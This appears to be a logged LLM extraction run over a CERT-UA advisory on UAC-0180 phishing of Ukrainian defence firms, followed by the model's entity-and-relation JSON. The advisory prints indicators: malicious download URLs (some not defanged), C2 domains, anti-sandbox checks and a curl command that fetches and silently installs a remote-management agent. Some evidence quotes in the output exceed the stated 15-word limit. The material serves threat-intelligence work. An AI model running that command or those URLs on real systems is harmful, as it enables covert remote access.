@@ -1,0 +1,360 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN RELATION TYPES ###
+- publishes: An organization or vendor officially releases or issues a security advisory, bulletin, or patch.
+- addresses-vulnerability-in: A security advisory or patch provides fixes for security vulnerabilities affecting a software product.
+- affects: A security vulnerability compromises or impacts a specific software product or component.
+- located-in: An organization, entity, or infrastructure is geographically or administratively based in a country or location.
+- part-of: An entity or component is a constituent sub-part of a larger system, suite, or organization.
+- hosts: An IP address, server, or domain hosts a specific file, malware payload, or service.
+- delivers: An exploit, campaign, or delivery mechanism drops or downloads a payload onto a target system.
+- exploits: A threat actor, malware, or campaign leverages a specific security vulnerability to compromise systems.
+- attacks: A threat actor compromises, targets, or executes unauthorized actions against a system, service, or organization.
+- communicates-with: A malware payload or host establishes network connections to an external IP address or server.
+- uses-malware: A threat actor utilizes or deploys a specific malware tool or family in their operations.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><em>(Оновлено 22.07.2024)</em></p><p><br></p><p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA отримано інформацію щодо розповсюдження серед українських оборонних підприємств електронних листів з тематикою закупівлі БпЛА та вкладенням у вигляді ZIP-файлу, що містить PDF-документ з посиланням.</p><p>У випадку переходу за посиланням на ЕОМ жертви буде завантажено файл "adobe_acrobat_fonts_pack.exe", що класифіковано як шкідливу програму GLUEEGG, розроблену з використанням мови програмування Go. Основним призначенням GLUEEGG є дешифрування (XOR зі 128-байтним ключем) та запуск завантажувача DROPCLUE, розробленого з викорисанням мови програмування Lua.</p><p>Останній забезпечить завантаження та відкриття на ЕОМ документу-приманки "UA-2024-07-04-010019-a-open.pdf", а також EXE-файлу "font-pack-pdf-windows-64-bit", що забезпечить запуск BAT-файлу, який, у свою чергу, за допомогою штатної утиліти "curl.exe" здійснить завантаження і встановлення MSI-файлу легітимної програми для віддаленого управління ЕОМ ATERA.</p><p>Зауважимо, що угрупування UAC-0180, незважаючи на широку географію атак, не полишає спроб отримання несанкціонованого доступу до ЕОМ співробітників оборонних підприємств та Сил оборони України використовуючи, при цьому, оновлюваний арсенал шкідливих програм, розроблених з використанням різних мов програмування, включаючи: C (ACROBAIT), Rust (ROSEBLOOM, ROSETHORN), Go (GLUEEGG), Lua (DROPCLUE), а також, на етапі первинного ураження, але не виключно, PDF-документи з посиланнями (доволі часто - з навмисно спотвореним вмістом).</p><p>Для спрощення процесу атрибуції в розділі індикаторів додатково наведено характеристики згаданих у статті зразків шкідливих програм.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">cbfac396e89776dd009f6c191be690c9&nbsp; &nbsp; a8c246d659cfcbc8ba40840634b9b0d46b81b00579a74f8f157f0dc71c5f8ed8&nbsp; &nbsp; UA-2024-07-04-010019.zip&nbsp;
+fb3cd8734a70842406dbe8ea8bee0fd2&nbsp; &nbsp; 40ee385eb112c8631f2566a2187cee844bf87984c88698106d92d469f580b134&nbsp; &nbsp; UA-2024-07-04-010019.pdf
+37e2751b26feffa619a7ff123842867b&nbsp; &nbsp; 82ba5c5af08a9b1b88faa0a87033af3af49e6d699dbf0df09fb4805283ff33d9&nbsp; &nbsp; adobe_acrobat_fonts_pack.exe (GLUEEGG)
+778c85b7ed5046afa17c20d4c4a604cb&nbsp; &nbsp; fb5bfd1c555b2d508f0e56bf44367203e05355440614c351bd685a9c3c84d3ed&nbsp; &nbsp; code1.lua (DROPCLUE)
+b73333ea586696a0ca41c8a7b2046e8c&nbsp; &nbsp; 4d502ff5892c3b60c32e89cf841c5d81c70786a9089c4ccc211029741b1bf387&nbsp; &nbsp; code2.lua (DROPCLUE)
+1191f83c3ffadac0142814ec9691829e&nbsp; &nbsp; c296a6f55e06729bbf4ec270f12ddc24678a1e622dfeb16bce64d9d20f44e03f&nbsp; &nbsp; code3.lua (DROPCLUE)
+bdd1b02c7588feb06e70874f3aa90d03&nbsp; &nbsp; 1937f46f81ee04c797987ca84bd9b338dc6e157b6928b957c0e685312e67ffc3&nbsp; &nbsp; UA-2024-07-04-010019-a-open.pdf
+57a9efe39f30a4284c0d5bfc3c80cc69&nbsp; &nbsp; 0a2d4764b70dfb0992608658cbafb641e3c38430364233f74b666a55b92817a5&nbsp; &nbsp; font-pack-pdf-windows-64-bit
+d7dbfe6b80590c5038dd8ef430c5277e&nbsp; &nbsp; 5f8ac3b5f4a33cafaf101f2ac63bad21bae88c6df7369fa58f0709ef35266a9e&nbsp; &nbsp; %random%.bat
+8a1bd632a9b8df88aae5e1d3439411ce&nbsp; &nbsp; ceedf36401ccea32d5465d955cc0a8a72c297182219338cf5521e557ce9ea963&nbsp; &nbsp; setup.msi (ATERA)
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXps://prozorro-ua[.]net/tender/ua-2024-06-25-006884-a/print/limited-reporting/adobe_acrobat_fonts_pack.exe
+hXXps://prozorro-ua[.]net/tender/ua-2024-06-25-006884-a/print/limited-reporting/ua-2024-07-04-010017/font-pack-pdf-windows-64-bit
+hXXps://prozorro-ua[.]net/tender/ua-2024-06-25-006894-a/print/limited-reporting/ua-2024-07-04-010019-a-open.pdf
+mariquillaharmond262@proton.me
+prozorro-ua[.]net
+servicedesk.atera[.]com (легітимний ресурс; звернути увагу якщо продукти ATERA не використовуються санкціоновано)
+</pre><pre class="hidden" spellcheck="false">https://prozorro-ua.net/tender/ua-2024-06-25-006884-a/print/limited-reporting/adobe_acrobat_fonts_pack.exe
+https://prozorro-ua.net/tender/ua-2024-06-25-006884-a/print/limited-reporting/ua-2024-07-04-010017/font-pack-pdf-windows-64-bit
+https://prozorro-ua.net/tender/ua-2024-06-25-006894-a/print/limited-reporting/ua-2024-07-04-010019-a-open.pdf
+mariquillaharmond262@proton.me
+prozorro-ua.net
+servicedesk.atera.com (легітимний ресурс; звернути увагу якщо продукти ATERA не використовуються санкціоновано)
+</pre><p><em>Хостові</em>:</p><pre class="ql-syntax" spellcheck="false">%TEMP%\AFDF1A4D36.tmp.exe
+%TEMP%\AFDF1A4D36.tmp.pdf
+%TEMP%\Prozorro-fonts-pack-3.2.exe
+%TEMP%\UA-2024-07-04-010019.pdf
+curl -o setup.msi "https://%REDACTED%.servicedesk.atera.com/GetAgent/Msi/?customerId=1&amp;integratorLogin=%REDACTED%&amp;accountId=%REDACTED%" &amp;&amp; msiexec /i setup.msi /qn&nbsp;IntegratorLogin=%REDACTED% CompanyId=1 AccountId=%REDACTED%
+</pre><p><br></p><p><strong>Додатково:</strong></p><pre class="ql-syntax" spellcheck="false">a41cd0977b7f57f35b958428433cebbd&nbsp;&nbsp;&nbsp;&nbsp;01ebc558aa7028723bebd8301fd110d01cbd66d9a8b04685afd4f04f76e7b80c&nbsp;&nbsp;&nbsp;&nbsp;AdobeFontPackage06192024_x64.exe&nbsp;(ROSEBLOOM)
+c670c06ad6b01053ad5ec3f8f4d2ec12&nbsp;&nbsp;&nbsp;&nbsp;846a7255eff6535d0e85c67a60712250df239a91c8b63df2073548d40434058c&nbsp;&nbsp;&nbsp;&nbsp;utility.dll&nbsp;(ROSETHORN)
+
+ACROBAIT:
+6fa6dd331844ee5cfe20c74353c1e442&nbsp;&nbsp;&nbsp;&nbsp;5390ba094cf556f9d7bbb00f90c9ca9e04044847c3293d6e468cb0aaeb688129&nbsp;&nbsp;&nbsp;&nbsp;2024-06-11&nbsp;14:07:32&nbsp;Attachment_CV_June2024.exe&nbsp;&nbsp;linedrv.com
+3464e68a88ad2640b7a39bc809e72abc&nbsp;&nbsp;&nbsp;&nbsp;036cce35a3b345e14b77be07f93141d817c5dc57114d34c6173e8d030df56d63&nbsp;&nbsp;&nbsp;&nbsp;2024-06-03&nbsp;07:54:41&nbsp;sketch.exe&nbsp;&nbsp;drv2ms.com
+7f2e4a44445b977ef8917cc0fb79035b&nbsp;&nbsp;&nbsp;&nbsp;0be3116a3edc063283f3693591c388eec67801cdd140a90c4270679e01677501&nbsp;&nbsp;&nbsp;&nbsp;2024-05-21&nbsp;07:57:13&nbsp;scan052224_CV.exe&nbsp;&nbsp;&nbsp;drv2ms.com
+d69cf309cb0e5d91237c6454e0e0dc45&nbsp;&nbsp;&nbsp;&nbsp;2c327087b063e89c376fd84d48af7b855e686936765876da2433485d496cb3a4&nbsp;&nbsp;&nbsp;&nbsp;2024-05-18&nbsp;13:54:07&nbsp;bzb.exe&nbsp;drv2ms.com
+19c5587c26ebe928bfeb0f80a393504b&nbsp;&nbsp;&nbsp;&nbsp;4881712c4b26ce79e7f68563326e0139c1abfd33a70771468e4ad26504f88a7d&nbsp;&nbsp;&nbsp;&nbsp;2024-05-17&nbsp;12:15:27&nbsp;morning.exe&nbsp;olminx.com
+524dda2410cc7ee8cc326ca42cebd7dd&nbsp;&nbsp;&nbsp;&nbsp;a2f2e88a5e2a3d81f4b130a2f93fb60b3de34550a7332895a084099d99a3d436&nbsp;&nbsp;&nbsp;&nbsp;2024-05-08&nbsp;13:11:51&nbsp;atch_List_of_Available_Documents.exe&nbsp;&nbsp;&nbsp;&nbsp;olminx.com
+56707756a2ee4994ceaf79659c7a52cd&nbsp;&nbsp;&nbsp;&nbsp;306c649e1ae4bb4235d2c01631264ea69924be5d958ffe411e402e3b6bc15c42&nbsp;&nbsp;&nbsp;&nbsp;2024-05-08&nbsp;09:29:05&nbsp;gfsa.exe&nbsp;&nbsp;&nbsp;&nbsp;olminx.com
+d8de4409320a29fde67b17f99a920496&nbsp;&nbsp;&nbsp;&nbsp;2ed3c0e73dd0ef0eb8dc4cac23a3c01ad87bcfad040ab898e220207b3cb8e50a&nbsp;&nbsp;&nbsp;&nbsp;2024-05-07&nbsp;14:26:17&nbsp;kssper.exe&nbsp;&nbsp;olminx.com
+5b29d2fa5be0d3a0811471856d293d6e&nbsp;&nbsp;&nbsp;&nbsp;29309a7916cd64b862051ff4f2dbf80b99a340b2d504ea4cbb8a13328d9e21b6&nbsp;&nbsp;&nbsp;&nbsp;2024-05-07&nbsp;12:15:14&nbsp;weds.exe&nbsp;&nbsp;&nbsp;&nbsp;olminx.com
+bf41ddac0e4facc46184f4a807445276&nbsp;&nbsp;&nbsp;&nbsp;e8140e66469f20292d94a431e795e027fc3c76dcadceff31e629739c56b117ab&nbsp;&nbsp;&nbsp;&nbsp;2024-05-07&nbsp;12:01:04&nbsp;convert.exe&nbsp;olminx.com
+c179d899a00862617e1263125a40c53f&nbsp;&nbsp;&nbsp;&nbsp;14d797fd2b00d52326285d8b39fb37798052130b6f2858f2bbe0660d31b0c0e0&nbsp;&nbsp;&nbsp;&nbsp;2024-05-06&nbsp;21:27:39&nbsp;wonder.exe&nbsp;&nbsp;olminx.com
+a1de88e6f579f98c4499d6eeaf70c88f&nbsp;&nbsp;&nbsp;&nbsp;86c683bd01512a3a9228dd4c3dc7ef4979e43344d9dd969804cc9cd263cf1316&nbsp;&nbsp;&nbsp;&nbsp;2024-05-06&nbsp;21:22:15&nbsp;qwors.exe&nbsp;&nbsp;&nbsp;olminx.com
+df678ec9c97db5bcfe8e8f5acc7e1cae&nbsp;&nbsp;&nbsp;&nbsp;dc7b8a3b3d03ad01e05b807618d3a5556cf3f699b5cffc3133ef7e1bc9efdd17&nbsp;&nbsp;&nbsp;&nbsp;2024-03-28&nbsp;07:44:10&nbsp;AdobeFontPackCx64_03292024.exe&nbsp;&nbsp;xeontime.com
+160b234c6cd4edd2c95125f8d1d4e641&nbsp;&nbsp;&nbsp;&nbsp;24392ef5cb5e1134728dcde7e22d0bcb3f934ea174737da294cecbc12abaaff8&nbsp;&nbsp;&nbsp;&nbsp;2024-04-08&nbsp;12:02:02&nbsp;Attachment_p-ssc.exe&nbsp;&nbsp;&nbsp;&nbsp;xeontime.com
+c0e499402acb6c302228b4a7923d5db6&nbsp;&nbsp;&nbsp;&nbsp;57e59b156a3ff2a3333075baef684f49c63069d296b3b036ced9ed781fd42312&nbsp;&nbsp;&nbsp;&nbsp;2024-03-27&nbsp;12:53:22&nbsp;Attachment_Medical_Report_Scan.pdf&nbsp;Open&nbsp;with&nbsp;Adobe&nbsp;Acrobat.exe&nbsp;&nbsp;xeontime.com
+36d4903ffafa75c00460292881b5dad7&nbsp;&nbsp;&nbsp;&nbsp;5c71601717bed14da74980ad554ad35d751691b2510653223c699e1f006195b8&nbsp;&nbsp;&nbsp;&nbsp;2024-04-23&nbsp;13:48:56&nbsp;Atch_Data_Breach_Evidence.pdf&nbsp;Open&nbsp;with&nbsp;Adobe&nbsp;Acrobat.exe&nbsp;&nbsp;&nbsp;devtools.bond
+fe2918d16a6956f3e5034f1e1a307d56&nbsp;&nbsp;&nbsp;&nbsp;e9637a384ac4f9a2647c279ea30e74c1cfdac27fe2a03c9466c294b51f02fa4c&nbsp;&nbsp;&nbsp;&nbsp;2024-04-23&nbsp;09:52:43&nbsp;signphoenix.exe&nbsp;xeontime.com
+
+Дані&nbsp;сертифікатів:
+3B&nbsp;0E&nbsp;38&nbsp;79&nbsp;26&nbsp;6F&nbsp;3B&nbsp;C9&nbsp;82&nbsp;25&nbsp;B3&nbsp;90&nbsp;Hangzhou&nbsp;Yueju&nbsp;Apparel&nbsp;Co.,&nbsp;Ltd.
+29&nbsp;9B&nbsp;8C&nbsp;D6&nbsp;80&nbsp;9B&nbsp;EB&nbsp;7A&nbsp;FE&nbsp;6A&nbsp;A1&nbsp;CE&nbsp;CC&nbsp;Byg&nbsp;og&nbsp;Udlejning&nbsp;ApS
+EC&nbsp;CE&nbsp;27&nbsp;DD&nbsp;88&nbsp;6C&nbsp;C2&nbsp;90&nbsp;43&nbsp;74&nbsp;62&nbsp;21&nbsp;B4&nbsp;FF&nbsp;40&nbsp;90&nbsp;LatexBalls
+A9&nbsp;4E&nbsp;F8&nbsp;7C&nbsp;15&nbsp;32&nbsp;9C&nbsp;88&nbsp;4C&nbsp;86&nbsp;63&nbsp;2B&nbsp;46&nbsp;02&nbsp;E4&nbsp;CE&nbsp;true&nbsp;corp
+0B&nbsp;C7&nbsp;77&nbsp;F8&nbsp;8D&nbsp;DF&nbsp;5F&nbsp;3C&nbsp;E4&nbsp;79&nbsp;45&nbsp;2F&nbsp;ARION&nbsp;LLC
+D5&nbsp;5F&nbsp;AE&nbsp;DB&nbsp;A8&nbsp;57&nbsp;A0&nbsp;A7&nbsp;47&nbsp;95&nbsp;D4&nbsp;E2&nbsp;A3&nbsp;A4&nbsp;20&nbsp;76&nbsp;Rtes&nbsp;vol.
+E6&nbsp;71&nbsp;DA&nbsp;87&nbsp;62&nbsp;63&nbsp;D1&nbsp;82&nbsp;40&nbsp;48&nbsp;34&nbsp;91&nbsp;1D&nbsp;63&nbsp;18&nbsp;01&nbsp;medium&nbsp;well
+4D&nbsp;69&nbsp;76&nbsp;36&nbsp;52&nbsp;EF&nbsp;60&nbsp;95&nbsp;4C&nbsp;DF&nbsp;06&nbsp;52&nbsp;32&nbsp;5C&nbsp;0F&nbsp;19&nbsp;human&nbsp;res
+6E&nbsp;1C&nbsp;D9&nbsp;E8&nbsp;F4&nbsp;83&nbsp;A6&nbsp;A4&nbsp;47&nbsp;3E&nbsp;A7&nbsp;77&nbsp;39&nbsp;6A&nbsp;7F&nbsp;7D&nbsp;Que1&nbsp;tech
+44&nbsp;78&nbsp;46&nbsp;AA&nbsp;56&nbsp;C0&nbsp;D1&nbsp;8E&nbsp;4D&nbsp;6F&nbsp;4A&nbsp;FB&nbsp;08&nbsp;4E&nbsp;C5&nbsp;12&nbsp;asd&nbsp;corp
+47&nbsp;F1&nbsp;A6&nbsp;9A&nbsp;DD&nbsp;E2&nbsp;73&nbsp;92&nbsp;4F&nbsp;E2&nbsp;53&nbsp;A5&nbsp;78&nbsp;40&nbsp;AD&nbsp;B5&nbsp;Nvd&nbsp;corp
+
+Доменні&nbsp;імена:
+linedrv[.]com&nbsp;    2024-06-11&nbsp;&nbsp;@tucows.com
+drv2ms[.]com&nbsp;&nbsp;    2024-05-18&nbsp;&nbsp;@tucows.com
+devtools[.]bond&nbsp;&nbsp;&nbsp;2024-04-23&nbsp;&nbsp;@tucows.com
+olminx[.]com&nbsp;    &nbsp;2024-04-17&nbsp;&nbsp;@tucows.com
+xeontime[.]com&nbsp;&nbsp;&nbsp;&nbsp;2024-03-26&nbsp;&nbsp;@tucows.com
+
+Анти-сендбокс:
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs&nbsp;(75,&nbsp;100)
+HKEY_CURRENT_USER\Keyboard&nbsp;Layout\Preload&nbsp;(00000422)
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags&nbsp;(&gt;50)
++&nbsp;початок&nbsp;(префікс)&nbsp;імені&nbsp;файлу&nbsp;(наприклад,&nbsp;"atch_")
+</pre><pre class="hidden" spellcheck="false">linedrv.com&nbsp;    2024-06-11&nbsp;&nbsp;@tucows.com
+drv2ms.com&nbsp;&nbsp;    2024-05-18&nbsp;&nbsp;@tucows.com
+devtools.bond&nbsp;&nbsp;&nbsp;2024-04-23&nbsp;&nbsp;@tucows.com
+olminx.com&nbsp;    &nbsp;2024-04-17&nbsp;&nbsp;@tucows.com
+xeontime.com&nbsp;&nbsp;&nbsp;&nbsp;2024-03-26&nbsp;&nbsp;@tucows.com
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p>Рис.1 Ланцюг ураження</p>
+
+=== RESPONSE (8.8s, in 7900 / out 3040 tok, STOP) ===
+Thinking process:
+
+1.  **Analyze the text and identify key entities:**
+    - Threat Actor: UAC-0180
+    - Targets/Victims: Ukrainian defense enterprises (оборонні підприємства), Defense Forces of Ukraine (Сили оборони України), Ukraine (Україна)
+    - Malware families: GLUEEGG, DROPCLUE, ACROBAIT, ROSEBLOOM, ROSETHORN
+    - Legitimate software/tools abused: ATERA, curl.exe
+    - Malicious/phishing files: UA-2024-07-04-010019.zip, UA-2024-07-04-010019.pdf, adobe_acrobat_fonts_pack.exe, UA-2024-07-04-010019-a-open.pdf, font-pack-pdf-windows-64-bit, setup.msi, AdobeFontPackage06192024_x64.exe, utility.dll
+    - Network indicators / domains / emails: prozorro-ua.net, servicedesk.atera.com, mariquillaharmond262@proton.me, linedrv.com, drv2ms.com, devtools.bond, olminx.com, xeontime.com
+
+2.  **Determine relationships:**
+    - UAC-0180 attacks Сили оборони України
+    - UAC-0180 uses-malware GLUEEGG, DROPCLUE, ACROBAIT, ROSEBLOOM, ROSETHORN
+    - GLUEEGG delivers DROPCLUE
+    - prozorro-ua.net hosts adobe_acrobat_fonts_pack.exe, font-pack-pdf-windows-64-bit, UA-2024-07-04-010019-a-open.pdf
+
+3.  **Construct JSON conforming strictly to guidelines.**
+
+{
+  "entities": [
+    {
+      "name": "UAC-0180",
+      "kind": "threat actor",
+      "gloss": "A threat actor tracked by CERT-UA targeting Ukrainian defense and military entities."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe."
+    },
+    {
+      "name": "Сили оборони України",
+      "kind": "armed forces",
+      "gloss": "The unified military and security forces defending the state of Ukraine."
+    },
+    {
+      "name": "GLUEEGG",
+      "kind": "malware family",
+      "gloss": "A Go-based malicious program used to decrypt and launch the DROPCLUE loader."
+    },
+    {
+      "name": "DROPCLUE",
+      "kind": "malware loader",
+      "gloss": "A Lua-based loader malware designed to download and execute secondary payloads and decoy documents."
+    },
+    {
+      "name": "ACROBAIT",
+      "kind": "malware family",
+      "gloss": "A C-based malware family utilized in phishing and infection chains by threat actors."
+    },
+    {
+      "name": "ROSEBLOOM",
+      "kind": "malware family",
+      "gloss": "A Rust-based malware family used in targeted cyberattacks."
+    },
+    {
+      "name": "ROSETHORN",
+      "kind": "malware family",
+      "gloss": "A Rust-based malware family deployed alongside other tools in cyber operations."
+    },
+    {
+      "name": "ATERA",
+      "kind": "software product",
+      "gloss": "A legitimate remote monitoring and management software platform."
+    },
+    {
+      "name": "curl.exe",
+      "kind": "executable file",
+      "gloss": "A command-line tool used for transferring data with URLs."
+    },
+    {
+      "name": "UA-2024-07-04-010019.zip",
+      "kind": "archive file",
+      "gloss": "A malicious ZIP archive distributed as an email attachment in cyber attacks."
+    },
+    {
+      "name": "UA-2024-07-04-010019.pdf",
+      "kind": "document file",
+      "gloss": "A malicious PDF document containing a lure link to download additional payloads."
+    },
+    {
+      "name": "adobe_acrobat_fonts_pack.exe",
+      "kind": "executable file",
+      "gloss": "A malicious executable delivering the GLUEEGG malware payload."
+    },
+    {
+      "name": "UA-2024-07-04-010019-a-open.pdf",
+      "kind": "document file",
+      "gloss": "A decoy PDF document opened during the infection process."
+    },
+    {
+      "name": "font-pack-pdf-windows-64-bit",
+      "kind": "executable file",
+      "gloss": "A malicious executable payload downloaded by the DROPCLUE loader."
+    },
+    {
+      "name": "setup.msi",
+      "kind": "installer file",
+      "gloss": "An MSI installer package for the Atera remote management agent."
+    },
+    {
+      "name": "AdobeFontPackage06192024_x64.exe",
+      "kind": "executable file",
+      "gloss": "A malicious executable file delivering the ROSEBLOOM malware."
+    },
+    {
+      "name": "utility.dll",
+      "kind": "dynamic link library",
+      "gloss": "A malicious dynamic link library associated with the ROSETHORN malware."
+    },
+    {
+      "name": "mariquillaharmond262@proton.me",
+      "kind": "email address",
+      "gloss": "An email address used in malicious campaigns."
+    },
+    {
+      "name": "prozorro-ua.net",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used to host payloads mimicking Ukrainian procurement infrastructure."
+    },
+    {
+      "name": "servicedesk.atera.com",
+      "kind": "internet domain",
+      "gloss": "A legitimate domain associated with the Atera remote management service."
+    },
+    {
+      "name": "linedrv.com",
+      "kind": "internet domain",
+      "gloss": "A domain used for malicious payload distribution or command and control."
+    },
+    {
+      "name": "drv2ms.com",
+      "kind": "internet domain",
+      "gloss": "A domain used for malicious command and control or payload staging."
+    },
+    {
+      "name": "devtools.bond",
+      "kind": "internet domain",
+      "gloss": "A domain used to host or distribute malicious payloads."
+    },
+    {
+      "name": "olminx.com",
+      "kind": "internet domain",
+      "gloss": "A domain associated with ACROBAIT malware distribution and infrastructure."
+    },
+    {
+      "name": "xeontime.com",
+      "kind": "internet domain",
+      "gloss": "A domain associated with malicious payload distribution and communication."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0180",
+      "type": "attacks",
+      "tail": "Сили оборони України",
+      "evidence": "угрупування UAC-0180, незважаючи на широку географію атак, не полишає спроб отримання несанкціонованого доступу до ЕОМ співробітників оборонних підприємств та Сил оборони України"
+    },
+    {
+      "head": "UAC-0180",
+      "type": "uses-malware",
+      "tail": "ACROBAIT",
+      "evidence": "використовуючи, при цьому, оновлюваний арсенал шкідливих програм, розроблених з використанням різних мов програмування, включаючи: C (ACROBAIT)"
+    },
+    {
+      "head": "UAC-0180",
+      "type": "uses-malware",
+      "tail": "ROSEBLOOM",
+      "evidence": "арсенал шкідливих програм, розроблених з використанням різних мов програмування, включаючи: C (ACROBAIT), Rust (ROSEBLOOM, ROSETHORN)"
+    },
+    {
+      "head": "UAC-0180",
+      "type": "uses-malware",
+      "tail": "ROSETHORN",
+      "evidence": "арсенал шкідливих програм, розроблених з використанням різних мов програмування, включаючи: C (ACROBAIT), Rust (ROSEBLOOM, ROSETHORN)"
+    },
+    {
+      "head": "UAC-0180",
+      "type": "uses-malware",
+      "tail": "GLUEEGG",
+      "evidence": "арсенал шкідливих програм, розроблених з використанням різних мов програмування, включаючи: C (ACROBAIT), Rust (ROSEBLOOM, ROSETHORN), Go (GLUEEGG)"
+    },
+    {
+      "head": "UAC-0180",
+      "type": "uses-malware",
+      "tail": "DROPCLUE",
+      "evidence": "арсенал шкідливих програм, розроблених з використанням різних мов програмування, включаючи: C (ACROBAIT), Rust (ROSEBLOOM, ROSETHORN), Go (GLUEEGG), Lua (DROPCLUE)"
+    },
+    {
+      "head": "GLUEEGG",
+      "type": "delivers",
+      "tail": "DROPCLUE",
+      "evidence": "Основним призначенням GLUEEGG є дешифрування (XOR зі 128-байтним ключем) та запуск завантажувача DROPCLUE"
+    },
+    {
+      "head": "DROPCLUE",
+      "type": "delivers",
+      "tail": "UA-2024-07-04-010019-a-open.pdf",
+      "evidence": "Останній забезпечить завантаження та відкриття на ЕОМ документу-приманки \"UA-2024-07-04-010019-a-open.pdf\""
+    },
+    {
+      "head": "DROPCLUE",
+      "type": "delivers",
+      "tail": "font-pack-pdf-windows-64-bit",
+      "evidence": "забезпечить завантаження та відкриття на ЕОМ документу-приманки \"UA-2024-07-04-010019-a-open.pdf\", а також EXE-файлу \"font-pack-pdf-windows-64-bit\""
+    },
+    {
+      "head": "prozorro-ua.net",
+      "type": "hosts",
+      "tail": "adobe_acrobat_fonts_pack.exe",
+      "evidence": "https://prozorro-ua.net/tender/ua-2024-06-25-006884-a/print/limited-reporting/adobe_acrobat_fonts_pack.exe"
+    },
+    {
+      "head": "prozorro-ua.net",
+      "type": "hosts",
+      "tail": "font-pack-pdf-windows-64-bit",
+      "evidence": "https://prozorro-ua.net/tender/ua-2024-06-25-006884-a/print/limited-reporting/ua-2024-07-04-010017/font-pack-pdf-windows-64-bit"
+    },
+    {
+      "head": "prozorro-ua.net",
+      "type": "hosts",
+      "tail": "UA-2024-07-04-010019-a-open.pdf",
+      "evidence": "https://prozorro-ua.net/tender/ua-2024-06-25-006894-a/print/limited-reporting/ua-2024-07-04-010019-a-open.pdf"
+    },
+    {
+      "head": "Сили оборони України",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Сил оборони України"
+    }
+  ],
+  "newRelationTypes": []
+}
